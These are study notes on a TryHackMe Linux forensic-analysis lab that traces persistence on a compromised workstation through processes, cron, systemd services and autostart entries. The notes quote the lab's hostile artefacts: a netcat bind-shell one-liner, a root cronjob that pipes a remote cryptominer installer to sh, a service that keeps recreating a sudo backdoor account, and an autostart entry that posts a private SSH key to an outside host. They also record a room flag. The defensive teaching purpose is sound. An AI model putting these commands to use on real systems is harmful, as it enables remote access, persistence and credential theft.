# Linux Process Analysis — TryHackMe

**Study date:** 21 November 2026  
**Platform:** TryHackMe  
**Scenario:** Live forensic analysis of a suspected compromised Linux workstation at Penguin Corp  
**Focus:** Investigation setup, processes, cronjobs, services, autostart scripts and application artefacts

> **Lab scope:** These notes document the authorised TryHackMe investigation environment. Do not run enumeration, collection or response commands against systems without permission. Preserve evidence before making changes to a suspected compromised host.

---

## 1. Investigation overview

In this room, I continued the Linux forensic investigation scenario from **Linux File System Analysis**. Penguin Corp suspects that a Linux workstation has been compromised. My task is to perform live analysis and look for signs of unauthorised changes, malicious execution and persistence.

The investigation focuses on:

- Running processes and parent-child process relationships.
- Services and their systemd unit files.
- Scheduled tasks managed by cron.
- System-wide and user-specific autostart scripts.
- Application artefacts such as shell histories, editor files and browser profiles.

The objective is to understand how different artefacts relate to each other, build an execution timeline, identify how suspicious activity starts, and determine how an attacker may maintain access.

## 2. Investigation setup

### 2.1 Connect to the lab machine

The TryHackMe task provides a Linux workstation and SSH connection details. I can use the split-view machine or connect from my own VPN-connected system using the credentials displayed in the room.

The machine is treated as already isolated from the network in the scenario, and backups have already been acquired. This is important because continued attacker access or remote tampering could change the evidence during an investigation.

**Evidence-handling principle:** In a real incident, I should document the system state and preserve relevant evidence before attempting remediation. Avoid deleting suspicious files or stopping processes before their details have been recorded, unless an immediate safety requirement takes priority.

### 2.2 Use trusted binaries and libraries

A compromised system may contain modified commands or libraries. An attacker with sufficient privileges could replace a legitimate utility with a malicious version that hides activity or changes the results returned to an investigator.

The TryHackMe workstation simulates a trusted USB mount at `/mnt/usb`. It contains copies of `/bin`, `/sbin`, `/lib` and `/lib64` from a clean Debian-based installation.

The lesson demonstrates changing environment variables:

```bash
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

| Variable | Purpose |
|---|---|
| `PATH` | Controls where the shell searches for executable commands |
| `LD_LIBRARY_PATH` | Adds directories that the dynamic linker searches for shared libraries |

The intention is to use known-good executables and libraries rather than relying on potentially altered components on the compromised host.

**Operational note:** These `export` commands replace the current values for this shell session. In a real forensic environment, confirm that the trusted toolset is compatible with the target and that required supporting binaries and libraries are available. Keep a record of the trusted media and tools used.

---

# Task 3 — Processes

## 3.1 What is a process?

A **process** is a running instance of a program. When a command or application is executed, Linux creates a process to run it.

Each process has a unique **Process ID (PID)**. Processes can also have parent-child relationships:

- The process that creates another process is its **parent**.
- The newly created process is its **child**.
- The parent process ID is recorded as the **PPID**.

Investigators examine these relationships to understand how a process started. A suspicious command may look less suspicious when viewed alone, but its parent process and surrounding activity can reveal that it was launched by a malicious script or scheduled task.

## 3.2 The `ps` command

`ps` provides a snapshot of processes. By default, it displays processes associated with the current terminal session.

```bash
ps
```

Example output from the lesson:

```text
PID TTY          TIME CMD
1335 pts/0    00:00:00 bash
1745 pts/0    00:00:00 ps
```

| Column | Meaning |
|---|---|
| PID | Unique Process ID |
| TTY | Terminal associated with the process |
| TIME | Cumulative CPU time consumed |
| CMD | Command associated with the process |

View processes belonging to Janice:

```bash
ps -u janice
```

Example output:

```text
PID TTY          TIME CMD
773 ?        00:00:00 sh
775 ?        00:00:00 abzkd83o4jakxld
781 ?        00:00:00 cat
782 ?        00:00:00 sh
783 ?        00:00:00 nc
```

The unfamiliar process name and the presence of `nc` are worth investigating. A process name by itself is not enough to determine whether activity is malicious; I need its command line, parent process, open files and network activity.

### View all processes in a hierarchy

```bash
ps -eFH
```

| Option | Meaning |
|---|---|
| `-e` | Selects all processes |
| `-F` | Displays extra-full information |
| `-H` | Displays processes in a hierarchy |

Relevant columns include `UID` (user), `PID`, `PPID`, `C` (CPU utilisation information), `SZ` (virtual memory size), `RSS` (resident memory), `STIME` (start time), `TTY`, `TIME` and `CMD`.

The lesson's example shows this suspicious chain:

```text
root 706   ... /usr/sbin/cron -f
root 769   ... /usr/sbin/CRON -f
janice 773 ... /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice 775 ... /bin/bash /home/janice/abzkd83o4jakxld.sh
janice 781 ... cat /tmp/f
janice 782 ... /bin/sh -i
janice 783 ... nc -l 0.0.0.0 4444
```

PIDs are assigned dynamically and may differ between lab sessions. The relationships and command lines are more important than memorising the example PID numbers.

## 3.3 Recognising a possible bind shell

One suspicious command is:

```bash
nc -l 0.0.0.0 4444
```

This starts a Netcat listener on all available network interfaces and port `4444`.

A **bind shell** is a setup in which a host listens on a port and provides a connecting party with access to a command shell. In an unauthorised context, this can provide remote command execution on the affected host.

Two other commands in the process tree are important:

```bash
cat /tmp/f
/bin/sh -i
```

The lesson explains that `/tmp/f` is used as a named pipe to pass data between the shell and the Netcat process. The interactive shell (`/bin/sh -i`) provides an interactive command interface.

Confirm the named pipe:

```bash
ls -l /tmp/f
```

Example output:

```text
prw-rw-r-- 1 janice janice 0 Mar 13 15:54 /tmp/f
```

The leading `p` in the permissions indicates that `/tmp/f` is a **named pipe (FIFO)**, rather than a regular file. The combined process evidence suggests that Janice's account is running a bind-shell listener on port `4444`.

## 3.4 `lsof` — List Open Files

`lsof` lists files opened by processes. On Linux, open-file information can include regular files, directories, pipes, sockets and network connections.

The lesson examines the Netcat process by PID:

```bash
sudo lsof -p <NC_PID>
```

Example output:

```text
COMMAND PID   USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
nc      783 janice  cwd    DIR  202,1     4096 1024049 /home/janice
nc      783 janice  rtd    DIR  202,1     4096       2 /
nc      783 janice    0r  FIFO   0,13      0t0   28393 pipe
nc      783 janice    1w  FIFO  202,1      0t0    3437 /tmp/f
nc      783 janice    2u   REG  202,1        0    2621 /tmp/#2621 (deleted)
nc      783 janice    3u  IPv4  28400      0t0     TCP *:4444 (LISTEN)
```

Important observations:

- The process has a FIFO associated with it.
- `/tmp/f` is opened as a pipe.
- The process has a TCP listener on port `4444`.
- The evidence is consistent with the suspected bind-shell setup.

The `FD` column describes the file descriptor and its access mode. The `TYPE` column identifies the object type. The `NAME` column shows the file, pipe or network endpoint.

## 3.5 `pstree` — Understand process ancestry

`pstree` displays processes as a tree, making parent-child relationships easier to understand.

```bash
pstree -p -s <PARENT_PID>
```

| Option | Meaning |
|---|---|
| `-p` | Displays PIDs |
| `-s` | Displays the selected process's parent processes |

Example:

```text
systemd(1)───cron(706)───cron(769)───sh(773)───abzkd83o4jakxld(775)─┬─cat(781)
                                                                    ├─nc(783)
                                                                    └─sh(782)
```

This tree shows that Netcat was started by intermediary shell processes, which were themselves started by cron. The suspicious listener was not necessarily started manually by a user; its ancestry leads back to the cron daemon.

## 3.6 Inspect the relevant process command lines

The lesson uses `ps -f` with the PIDs discovered in the process tree:

```bash
ps -f <PID_1> <PID_2> <PID_3> <PID_4>
```

Example:

```text
UID     PID  PPID  C STIME TTY STAT TIME CMD
root    769   706  0 22:08 ?   S    0:00 /usr/sbin/CRON -f
janice  773   769  0 22:08 ?   Ss   0:00 /bin/sh -c /home/janice/abzkd83o4jakxld.sh
janice  775   773  0 22:08 ?   S    0:00 /bin/bash /home/janice/abzkd83o4jakxld.sh
janice  783   775  0 22:08 ?   S    0:00 nc -l 0.0.0.0 4444
```

The output identifies the suspicious script:

```text
/home/janice/abzkd83o4jakxld.sh
```

Inspecting the script reveals the command responsible for the bind shell:

```bash
cat /home/janice/abzkd83o4jakxld.sh
```

Relevant script content from the lesson:

```bash
#!/bin/bash

# Set the path to the lock file
LOCKFILE="/tmp/abzkd83o4jakxld.lock"

# Check if lock file exists
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running. Exiting."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Main command
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

# Remove lock file
rm -f "$LOCKFILE"
```

The script:

1. Defines a lock-file path.
2. Checks whether the lock file already exists.
3. Creates a lock file to help prevent another instance from running.
4. Removes any existing `/tmp/f` file.
5. Creates a named pipe at `/tmp/f`.
6. Connects the pipe to an interactive shell and a Netcat listener.
7. Removes the lock file when the command sequence exits.

The lesson identifies this as a bind-shell command used for persistence and future remote access.

## 3.7 `top` — Real-time process monitoring

Unlike `ps`, which provides a snapshot, `top` continuously refreshes process information.

```bash
top -d 5 -c -u janice
```

| Option | Meaning |
|---|---|
| `-d 5` | Refresh interval of five seconds |
| `-c` | Displays the full command line |
| `-u janice` | Filters processes owned by Janice |

Press `q` to exit. The lesson's output shows the same suspicious commands: the script, `cat /tmp/f`, interactive shell and Netcat listener.

## 3.8 Process analysis methodology

When I investigate a suspicious process, I should collect:

1. Process name and full command line.
2. PID and PPID.
3. User and group running the process.
4. Process start time and current state.
5. Parent-child process tree.
6. Open files, pipes and sockets.
7. Network listeners or active connections.
8. Executable and script paths.
9. Related cronjobs or services that may have launched it.
10. Relevant logs and timestamps.

**SOC perspective:** A process such as `nc` or `bash` is not automatically malicious. Context makes the difference. An unexpected shell spawned by a web server, scheduled task or service account may indicate exploitation or persistence. Establish a baseline of normal process names, parent-child relationships, users and resource usage, then alert on deviations.

---

# Task 4 — Cronjobs

## 4.1 What are cronjobs?

**Cronjobs** are scheduled tasks that run automatically at predefined times or intervals. The **cron daemon** is the background process responsible for executing these tasks based on crontab configuration.

The lesson identifies two important locations:

- User crontabs: `/var/spool/cron/crontabs/`
- System-wide crontab: `/etc/crontab`

Cronjobs are useful for backups, maintenance and automation. Attackers can also abuse them to run malicious scripts repeatedly and maintain persistence.

## 4.2 Cron schedule syntax

A cron entry has five time fields followed by the command:

```text
minute hour day-of-month month day-of-week command
```

Example from the lesson:

```text
10 05 * * * /home/bob/backup_tmp.sh
```

This runs `/home/bob/backup_tmp.sh` every day at 5:10 AM.

| Field | Example | Meaning |
|---|---|---|
| Minute | `10` | At minute 10 |
| Hour | `05` | At hour 5 |
| Day of month | `*` | Every day of the month |
| Month | `*` | Every month |
| Day of week | `*` | Every day of the week |
| Command | `/home/bob/backup_tmp.sh` | Command to execute |

The asterisk (`*`) means every valid value for that field.

**System-wide vs user-level cron:** System-level entries in `/etc/crontab` include an additional username field specifying which account runs the command. User-level crontabs do not need that field because the crontab already belongs to a specific user.

## 4.3 Inspect `/etc/crontab`

```bash
cat /etc/crontab
```

The lesson's example includes:

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5 * * * * root /var/tmp/backup
```

The cron entry means that `/var/tmp/backup` executes every five minutes as `root`.

### Why is this suspicious?

The script is located in `/var/tmp`, a location that may be writable by ordinary users depending on its permissions and configuration. A privileged scheduled job that executes a file an untrusted user can modify creates a serious privilege-escalation risk.

Verify the actual directory and file permissions during an investigation:

```bash
ls -ld /var/tmp
ls -l /var/tmp/backup
stat /var/tmp/backup
```

The lesson's backup script contains:

```bash
#!/bin/bash

tar -czf web_backup.tar.gz /var/www/html && curl -sSL http://h4x0rcr7pt.thm/install-xmrig.sh | sh
```

The first command creates a compressed archive of `/var/www/html`. The second downloads a script with `curl` and pipes it directly to a shell. The script name suggests a connection to XMRig cryptocurrency-mining software. The unexpected download-and-execute operation is suspicious and should be investigated as possible unauthorised cryptomining or malware installation.

**Forensic caution:** Do not execute a suspicious script to see what it does. Preserve it, calculate a hash, inspect it safely and correlate its execution with logs and network evidence.

## 4.4 Other system cron directories

The lesson identifies these directories:

| Directory | Intended schedule |
|---|---|
| `/etc/cron.hourly/` | Hourly |
| `/etc/cron.daily/` | Daily |
| `/etc/cron.weekly/` | Weekly |
| `/etc/cron.monthly/` | Monthly |
| `/etc/cron.d/` | Additional system cron configuration |

List their contents:

```bash
ls -la /etc/cron.d
ls -la /etc/cron.hourly
ls -la /etc/cron.daily
ls -la /etc/cron.weekly
ls -la /etc/cron.monthly
```

The lesson's example includes a `beacon` entry under `/etc/cron.hourly`. An unfamiliar filename such as this deserves further inspection, but its name alone does not establish maliciousness.

## 4.5 Inspect user-level cronjobs

User crontab files are stored in:

```text
/var/spool/cron/crontabs/
```

List the directory with elevated privileges:

```bash
sudo ls -al /var/spool/cron/crontabs/
```

The lesson's example shows crontabs for users including Bob, Elijah, Janice, root and ubuntu.

To view a specific user's crontab:

```bash
sudo crontab -l -u janice
```

The example reveals:

```text
# m h dom mon dow command
* * * * * /home/janice/abzkd83o4jakxld.sh
```

This explains the process chain from Task 3: Janice's crontab runs the suspicious script every minute, repeatedly launching the bind-shell setup.

## 4.6 Enumerate crontabs for all users

The lesson provides this one-liner to iterate over usernames in `/etc/passwd`, query their crontabs and print entries that are not comments:

```bash
sudo bash -c 'for user in $(cut -f1 -d: /etc/passwd); do entries=$(crontab -u $user -l 2>/dev/null | grep -v "^#"); if [ -n "$entries" ]; then echo "$user: Crontab entry found!"; echo "$entries"; echo; fi; done'
```

The command works in this order:

1. Reads usernames from `/etc/passwd`.
2. Iterates over each username.
3. Uses `crontab -u` to list that user's cron entries.
4. Suppresses errors for accounts without a crontab.
5. Filters out comment lines.
6. Prints the username and any remaining cron entries.

The lesson's example identifies entries for Janice and Bob:

```text
janice: Crontab entry found!
* * * * * /home/janice/abzkd83o4jakxld.sh

bob: Crontab entry found!
10 05 * * * /home/bob/backup_tmp.sh
30 04 * * * /var/tmp/findme.sh
```

## 4.7 Cron execution logs

Cron logs help establish when scheduled tasks ran and whether users edited their crontabs.

On Debian-based systems, cron messages are commonly recorded in `/var/log/syslog`. On some distributions, such as RHEL and CentOS, they may be stored in `/var/log/cron`.

Search for cron activity:

```bash
sudo grep cron /var/log/syslog
```

Filter for failures and errors:

```bash
sudo grep cron /var/log/syslog | grep -E 'failed|error|fatal'
```

Filter for a particular user:

```bash
sudo grep cron /var/log/syslog | grep -i 'bob'
```

The lesson's example shows timestamps and events such as a root user listing Bob's crontab, Bob beginning and ending a crontab edit, a crontab replacement and the cron daemon reloading Bob's crontab. These records help build a timeline of when scheduled tasks were created or modified.

## 4.8 Pspy — Monitor process execution

**Pspy** is an open-source process-monitoring tool that can observe process activity without requiring root privileges. The lesson describes it as reading information from `/proc` and reporting details such as timestamp, UID, PID, PPID and executed command.

The lab includes `pspy64`. Start it with:

```bash
pspy64
```

Allow it to run long enough to capture scheduled activity. Press `Ctrl + C` to stop.

Example output from the lesson:

```text
2024/03/13 19:38:45 CMD: UID=0     PID=1      | /sbin/init
2024/03/13 19:39:01 CMD: UID=0     PID=3396   | /usr/sbin/CRON -f
2024/03/13 19:39:01 CMD: UID=1003  PID=3403   | /bin/bash /home/janice/abzkd83o4jakxld.sh
2024/03/13 19:39:01 CMD: UID=1003  PID=3402   | /bin/sh -i
2024/03/13 19:39:01 CMD: UID=1003  PID=3401   | /bin/bash /home/janice/abzkd83o4jakxld.sh
```

Pspy provides useful execution evidence, particularly when a process runs too briefly to be captured by a manual `ps` command.

## 4.9 Task 4 supplied answers

| Question | Answer |
|---|---|
| Full URL of the C2 server in a suspicious system-level cronjob | `http://c2.intelligent-software.thm:8310/beacon` |
| Hidden flag found in one of the user-level cron scripts | `THM{4682786cf2d92f01c4d30a2bbf4621f7}` |
| Decoded flag echoed every 15 seconds by a process observed with Pspy | **[Not included in the supplied lesson text]** |

I have not guessed the final decoded flag because its value was not present in the material supplied.

**SOC perspective:** Cron persistence can be difficult to notice because scheduled tasks are normal in Linux administration. Compare tasks against a known-good baseline, identify the owner and privileges, inspect the referenced script, verify permissions and correlate execution time with system logs and process telemetry.

---

# Task 5 — Services

## 5.1 What are services?

Linux **services** are background processes or daemons that continuously perform tasks such as managing system resources, providing network services or handling user requests.

Examples include `cron` (scheduled tasks), `sshd` (SSH access) and Apache HTTP Server (web content). Services are commonly managed by `systemd` or an init system. Some environments, such as BusyBox-based systems, do not use systemd.

Attackers may abuse services by exploiting vulnerabilities, changing service configurations, modifying service executables or creating new services that run malicious commands automatically.

## 5.2 `systemctl` — Enumerate and manage services

`systemctl` is used to interact with systemd and manage services.

| Command | Purpose |
|---|---|
| `systemctl start <service>` | Starts a service |
| `systemctl stop <service>` | Stops a service |
| `systemctl restart <service>` | Restarts a service |
| `systemctl enable <service>` | Configures a service to start automatically at boot |
| `systemctl disable <service>` | Disables automatic startup |
| `systemctl status <service>` | Displays service status and related information |

For forensic work, begin with read-only enumeration.

List all service units:

```bash
sudo systemctl list-units --all --type=service
```

List currently running services:

```bash
sudo systemctl list-units --type=service --state=running
```

The lesson identifies an unfamiliar service:

```text
b4ckd00rftw.service
```

An unusual name is an investigative lead. It should be checked against the host's normal service baseline.

## 5.3 Investigate a suspicious service

Check the service's status:

```bash
sudo systemctl status b4ckd00rftw.service
```

The lesson's output includes:

```text
b4ckd00rftw.service - Backdoor Service
Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
Active: active (running)
Main PID: 596 (b4ckd00rftw.sh)
CGroup: /system.slice/b4ckd00rftw.service
        ├─596 /bin/bash /usr/local/bin/b4ckd00rftw.sh
        └─4067 sleep 60
```

This output provides several findings:

- The service is enabled, so it is configured to start automatically.
- It is currently active and running.
- The main process is a Bash script.
- The executable path is `/usr/local/bin/b4ckd00rftw.sh`.
- The process tree includes `sleep 60`, suggesting a repeated operation with a 60-second interval.

## 5.4 Inspect the service executable

Read the script identified in the service status:

```bash
cat /usr/local/bin/b4ckd00rftw.sh
```

Relevant lesson content:

```bash
#!/bin/bash

while true; do
    sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
    sudo usermod -aG sudo b4ckd00rftw
    sleep 60
done
```

The script:

1. Runs continuously inside a loop.
2. Attempts to create a user named `b4ckd00rftw`.
3. Uses `openssl passwd -1` to generate a password hash for the account.
4. Adds the account to the `sudo` group.
5. Waits 60 seconds.
6. Repeats the process.

This is a persistence mechanism. Even if a responder removes the unauthorised account, the service may attempt to recreate it.

The lesson's example includes a password string in the lab script. It is documented here as a lab artefact, not as a credential to reuse.

## 5.5 Inspect the systemd unit file

The service status identifies the unit file location:

```text
/etc/systemd/system/b4ckd00rftw.service
```

Read it:

```bash
cat /etc/systemd/system/b4ckd00rftw.service
```

Example from the lesson:

```ini
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/b4ckd00rftw.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

| Directive | Meaning |
|---|---|
| `[Unit]` | Describes the unit and its dependencies |
| `Description` | Human-readable service description |
| `After` | Specifies ordering relative to another unit |
| `[Service]` | Defines service execution behaviour |
| `Type=simple` | Treats the process started by `ExecStart` as the main service process |
| `ExecStart` | Command or executable started by the service |
| `Restart=always` | Configures systemd to restart the service when it exits |
| `[Install]` | Defines installation and enablement information |
| `WantedBy=multi-user.target` | Allows the service to be enabled for the multi-user target |

The `ExecStart` directive is particularly important because it identifies the script or binary launched by the service.

## 5.6 Inspect service logs with `journalctl`

Systemd journal logs can help reconstruct service activity.

Follow logs for the suspicious service in real time:

```bash
sudo journalctl -f -u b4ckd00rftw.service
```

To view existing logs without following new entries, omit `-f`:

```bash
sudo journalctl -u b4ckd00rftw.service
```

The lesson's sample output shows:

- `sudo` commands invoking `useradd`.
- The `useradd` command reporting that the user already exists.
- `usermod` being invoked to add the user to the sudo group.
- A message written by the service script.

These events provide evidence of the service attempting to maintain the backdoor account.

### SOC investigation workflow for services

1. Enumerate all services.
2. Compare names and startup behaviour against the normal baseline.
3. Check status, start time, main PID and process tree.
4. Identify the unit file path.
5. Inspect the unit file and the executable specified by `ExecStart`.
6. Check permissions, ownership, hashes and timestamps of the executable.
7. Review the service's journal logs.
8. Correlate service activity with user creation, authentication and network events.

**Incident-response reminder:** Simply removing the backdoor user may not be sufficient. A persistence service can recreate it. A thorough investigation and recovery from known-good backups may be required.

---

# Task 6 — Autostart Scripts

## 6.1 What are autostart scripts?

Autostart scripts or entries are commands and scripts that execute automatically when a system starts or when a user logs in.

| Mechanism | Typical execution behaviour |
|---|---|
| Autostart entry | Runs at system startup or user login |
| Cronjob | Runs at a configured time or interval |
| Service/daemon | Runs in the background, often managed by systemd |

Attackers may modify autostart entries to execute commands, launch malware, steal data or maintain access.

## 6.2 System-wide autostart locations

The lesson identifies these locations:

- `/etc/init.d/` — scripts associated with traditional SysV init service management.
- `/etc/rc.d/` — another location used by some systems for init scripts.
- `/etc/systemd/system/` — systemd unit files that define services and startup behaviour.

The lesson gives this example of a suspicious unit file:

```text
/etc/systemd/system/b4ckd00rftw.service
```

This links autostart investigation to the service persistence covered in Task 5.

## 6.3 User-specific autostart locations

Desktop environments commonly use:

```text
~/.config/autostart/
```

The directory can contain `.desktop` files that define applications or commands to run when the user logs in.

To list autostart entries for users under `/home`:

```bash
ls -a /home/*/.config/autostart
```

The lesson's example identifies:

```text
/home/eduardo/.config/autostart:
.  ..  dev.desktop

/home/janice/.config/autostart:
.  ..  keygrabber.desktop
```

The `keygrabber.desktop` entry under Janice's account is suspicious and should be examined.

## 6.4 Understand `.desktop` file syntax

The lesson provides this benign example:

```ini
[Desktop Entry]
Type=Application
Name=Setup Development Environment
Exec=/bin/bash -c "/home/eduardo/setup_dev_env.sh"
```

| Field | Meaning |
|---|---|
| `[Desktop Entry]` | Standard header for a desktop entry |
| `Type=Application` | Identifies the entry as an application |
| `Name` | Display name for the entry |
| `Exec` | Command executed when the entry is launched |

The `Exec` value is particularly important during forensic analysis. It may run a legitimate application or execute a script that performs unauthorised actions.

## 6.5 Investigate Janice's autostart entry

The lesson reads the file with:

```bash
cat /home/janice/.config/autostart/keygrabber.desktop
```

Relevant content shown in the lesson:

```ini
[Desktop Entry]
Type=Application
Name=Standard Desktop Configuration (DO NOT MODIFY)
Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' http://*****.****-**-********.***/**_***"
```

The URL is redacted in the supplied lesson text.

The command uses `curl` to send the contents of Janice's private SSH key to an external endpoint using an HTTP POST request.

This is a likely credential-exfiltration mechanism:

1. Janice logs into the desktop environment.
2. The autostart entry launches Bash.
3. Bash executes the `curl` command.
4. The private SSH key is submitted to an external server.

The file `id_rsa` is a private SSH key and should not be shared. Anyone who obtains a usable private key may be able to authenticate as the associated user, depending on key protection and server configuration.

**Finding:** The autostart entry appears designed to exfiltrate Janice's SSH private key each time the relevant autostart event occurs.

## 6.6 Other user-related artefacts

The lesson recommends examining these locations:

| Artefact | Why it matters |
|---|---|
| `~/.bash_history` | May show commands typed by the user in Bash |
| `~/.ssh/` | Contains SSH keys, `known_hosts`, `authorized_keys` and client configuration |
| `~/.profile` | May contain commands and environment setup executed at login |
| `~/.config/autostart/` | May contain desktop autostart entries |
| `/etc/update-motd.d/` | Contains scripts used to construct the Message of the Day on applicable systems |
| `/usr/lib/update-notifier/` | Another location mentioned by the lesson in relation to MOTD/update notification components |

The Message of the Day (MOTD) is displayed when a user connects to a Linux server via SSH or a serial connection. The lesson notes that malicious MOTD-related scripts can be abused to execute commands when users connect.

## 6.7 Task 6 answer record

| Question | Answer from supplied material |
|---|---|
| Full URL receiving Janice's private SSH key | **Not available — the URL is masked with asterisks in the supplied lesson text** |
| Command executed by the “Show Network Interfaces” autostart script | **Not included in the supplied lesson text** |

I have not reconstructed either answer because the actual URL and the relevant `.desktop` file contents were not provided.

**SOC perspective:** For each autostart entry, record the owner, file path, timestamps, permissions, display name and exact `Exec` command. Investigate scripts and external URLs without executing them. For suspected credential exfiltration, correlate endpoint evidence with DNS, proxy, firewall and network telemetry.

---

# Task 7 — Application Artefacts

## 7.1 What are application artefacts?

Application artefacts are data generated or stored by software while it operates. They can include configuration files, application logs, cache files, user histories, browser profiles, cookies, downloads and bookmarks.

These artefacts help investigators reconstruct activity, understand how the system was used and identify suspicious behaviour.

## 7.2 Inventory installed applications with `dpkg`

A useful first step is identifying software installed through the Debian package manager.

```bash
sudo dpkg -l
```

This lists installed packages and their versions.

**Limitation:** This only inventories packages installed through the package manager. It does not provide a complete list of manually installed programs or every application component. Manual filesystem analysis may still be necessary.

## 7.3 Vim artefacts — `.viminfo`

Vim is a common text editor on UNIX-like systems. It may leave behind a `.viminfo` file containing information about user interactions.

The file can include Vim version information, encoding details, the last search pattern, command-line history and other information retained from Vim sessions. An investigator may use it to identify searches or commands associated with possible modifications to scripts and configuration files.

Find `.viminfo` files under `/home`:

```bash
find /home/ -type f -name ".viminfo" 2>/dev/null
```

The lesson's output:

```text
/home/janice/.viminfo
/home/ubuntu/.viminfo
```

Inspect Janice's file:

```bash
sudo cat /home/janice/.viminfo
```

The supplied sample shows:

```text
# This viminfo file was generated by Vim 8.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

...
# Last Search Pattern:
~MSle0~/

# Command Line History (newest to oldest):
:q
|2,0,1710339077,,"q"
...
```

Other text editor artefacts mentioned by the lesson include `.nano_history` for Nano and `.emacs` or `.emacs.d` for Emacs.

## 7.4 Browser artefacts

Browsers such as Mozilla Firefox and Google Chrome store information that may help reconstruct user activity.

Potentially useful artefacts include browsing history, download history, bookmarks, cookies, search activity and profile configuration data.

The lesson identifies these common profile locations:

| Browser | Profile location |
|---|---|
| Firefox | `~/.mozilla/firefox/` |
| Google Chrome | `~/.config/google-chrome/` |

Find these directories under `/home`:

```bash
sudo find /home -type d \( -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome" \) 2>/dev/null
```

Example output:

```text
/home/ubuntu/.mozilla/firefox
/home/eduardo/.mozilla/firefox
```

## 7.5 Identify the Firefox profile

The lesson focuses on Eduardo's Firefox profile. List the directory:

```bash
sudo ls -al /home/eduardo/.mozilla/firefox
```

The supplied output contains two profiles:

```text
lwvdnf29.default
niijyovp.default-release
```

The lesson chooses `niijyovp.default-release` for further analysis and treats the `.default` profile as a legacy configuration.

Selected profile path:

```text
/home/eduardo/.mozilla/firefox/niijyovp.default-release
```

## 7.6 Dumpzilla — Browser forensic analysis

**Dumpzilla** is a forensic tool used to extract information from browser profiles. The lesson states that it can parse extensions, bookmarks, cookies, downloads, browsing history, search information and other browser profile information.

The lab provides the script at:

```text
/home/investigator/dumpzilla.py
```

The lesson uses elevated privileges to read the selected Firefox profile.

Run a summary:

```bash
sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Summary --Verbosity CRITICAL
```

The sample summary from the lesson:

```text
==================
Total Information
==================
Total Addons (URLS/PATHS)  : 3
Total Addons               : 0
Total Bookmarks            : 10
Total Cookies              : 34
Total Directories          : 0
Total Downloads history    : 1
Total Search Engines       : 6
Total Forms                : 0
Total History              : 14
Total Public Key Pinning   : 9
Total Permissions          : 4
Total Preferences          : 162
Total Sessions             : 0
```

This gives an overview of which types of artefacts exist in the profile. It does not, by itself, establish malicious activity.

### Useful Dumpzilla options

The lesson lists these extraction options:

```text
--Addons
--Search
--Bookmarks
--Cookies
--Downloads
--History
```

For example, extract cookies:

```bash
sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release --Cookies
```

The lesson's sample output includes:

```text
=======
Cookies
=======
=> Source file: /home/eduardo/.mozilla/firefox/niijyovp.default-release/cookies.sqlite
=> SHA256 hash: f69caa997d098901992cfdd1c74c1d618d380a47f755b98539e8ec5dbb2efe3b

Host: www.mate-look.org
Name: __ocs_id
Value: ohdsjfhnrb6c8ae8rg02ha0aj5
Path: /
Expiry: 2022-03-29 16:40:22
Last Access: 2022-02-27 16:42:53
Creation Time: 2022-02-27 16:40:22
Secure: No
HttpOnly: Yes
...
```

Cookies may contain session-related information, so they must be handled as sensitive evidence. Do not publish cookie values or browser credentials in a public repository.

### Interpreting browser artefacts

Browser history, searches, downloads and cookies can help identify websites visited, files downloaded, potentially malicious URLs, possible interaction with command-and-control infrastructure, possible data-exfiltration activity and potentially stolen or abused session cookies.

A suspicious domain or cookie is an investigation lead, not proof on its own. Correlate browser timestamps with DNS, proxy, endpoint and network records.

## 7.7 Other application artefacts

The lesson notes that artefacts depend on the applications and purpose of the workstation.

| Application / system role | Potential artefacts |
|---|---|
| Email client | Configuration files and message stores |
| Word processor | Recently accessed documents and temporary files |
| Screen or Tmux | Session-related information and command activity |
| Web server | Access logs, error logs, configuration and web application logs |
| WordPress or Joomla | CMS configuration files, databases and application artefacts |
| Database server | Database logs, configuration files and SQL query logs |

A good investigator first identifies which applications and services are installed or running, then determines which artefacts those applications may have left behind.

---

# 8. Connecting the findings into one investigation

One of the most important lessons from this room is that individual artefacts become much more useful when connected.

The TryHackMe examples show several related persistence mechanisms:

1. **Process evidence:** A Netcat listener on port `4444` is running with an interactive shell and named pipe.
2. **Process ancestry:** The process tree traces the listener to a script executed by cron.
3. **Cron evidence:** Janice's crontab runs the suspicious script every minute.
4. **Service evidence:** A suspicious systemd service repeatedly attempts to create a user and add it to the sudo group.
5. **Autostart evidence:** Janice's desktop autostart entry attempts to send her private SSH key to an external endpoint.
6. **Application evidence:** Editor and browser artefacts can help reconstruct user activity and identify potentially accessed websites or downloaded files.

These findings suggest that the workstation contains multiple persistence and credential-theft mechanisms. A complete incident report should include the evidence source, observed timestamp, affected account, file path, process or service involved, network indicator and confidence level for each conclusion.

## Example investigation record

| Area | Evidence to record | Investigative question |
|---|---|---|
| Processes | PID, PPID, user, command line, start time | What launched the suspicious process? |
| Open files | Files, FIFOs, sockets and network descriptors | What resources is the process using? |
| Process tree | Parent and child process chain | Did cron, a service or a user session start it? |
| Cronjobs | Schedule, owner, command, file permissions | Does a scheduled task execute an unexpected script? |
| Services | Unit file, `ExecStart`, executable, status | Is a service providing persistence? |
| Autostart | `.desktop` file, `Exec` command, owner | Does it run commands or transmit sensitive data at login? |
| Application artefacts | Histories, browser profiles, cookies, downloads | What activity may have occurred before discovery? |
| Logs | Timestamps, user IDs, command records | Can the activity be placed into a timeline? |

---

# 9. My Key Takeaways

- I learned that a Linux process has a PID and can be related to other processes through parent-child relationships.
